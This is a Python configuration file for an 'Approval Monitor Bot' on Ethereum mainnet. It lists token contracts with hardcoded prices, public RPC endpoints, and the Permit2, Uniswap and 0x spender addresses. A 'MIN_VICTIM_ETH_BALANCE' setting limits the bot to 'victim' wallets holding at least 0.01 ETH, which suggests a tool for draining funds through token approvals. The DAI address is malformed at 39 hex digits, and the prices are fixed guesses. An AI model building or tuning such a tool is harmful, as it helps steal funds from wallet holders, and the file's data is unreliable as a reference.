"""
Configuration file for Approval Monitor Bot
Ethereum Mainnet (chain_id=1) ONLY
"""

CHAIN_ID = 1
CHAIN_NAME = "ethereum"
NETWORK_NAME = "Ethereum Mainnet"

CUSTOM_TOKENS = {
    "USDT": {
        "address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        "decimals": 6,
        "price_usd": 1.0
    },
    "USDC": {
        "address": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        "decimals": 6,
        "price_usd": 1.0
    },
    "DAI": {
        "address": "0x6B175474E89094C44Da98b954EeB8e8B778E489",
        "decimals": 18,
        "price_usd": 1.0
    },
    "WETH": {
        "address": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
        "decimals": 18,
        "price_usd": 2500.0
    },
    "WBTC": {
        "address": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
        "decimals": 8,
        "price_usd": 40000.0
    },
    "LINK": {
        "address": "0x514910771AF9Ca656af840dff83E8264EcF986CA",
        "decimals": 18,
        "price_usd": 15.0
    },
    "UNI": {
        "address": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
        "decimals": 18,
        "price_usd": 8.0
    },
    "SHIB": {
        "address": "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
        "decimals": 18,
        "price_usd": 0.000009
    },
    "PEPE": {
        "address": "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
        "decimals": 18,
        "price_usd": 0.000009
    },
    "STETH": {
        "address": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
        "decimals": 18,
        "price_usd": 2500.0
    },
}

POPULAR_TOKENS = CUSTOM_TOKENS

RPC_ENDPOINTS = {
    "ethereum": "https://eth.llamarpc.com",
}

ETHEREUM_PUBLIC_RPCS = [
    "https://eth.llamarpc.com",
    "https://ethereum.publicnode.com",
    "https://rpc.ankr.com/eth",
    "https://cloudflare-eth.com",
    "https://eth-mainnet.public.blastapi.io",
]

# ── ETH Balance Filter ──────────────────────────────────────────────────────
# Bot will ONLY process wallets whose native ETH balance is >= this value.
# Set to 0 to disable the filter.
MIN_VICTIM_ETH_BALANCE = 0.01   # ETH  (e.g. 0.01 = 10 Finney)

ETHEREUM_SPENDER_ADDRESSES = [
    "0x000000000022D473030F116dDEE9F6B43aC78BA3",
    "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
    "0xE592427A0AEce92De3Edee1F18E0157C05861564",
    "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45",
    "0xdef1c0ded9bec7f1a1670819833240f027b25eff",
]
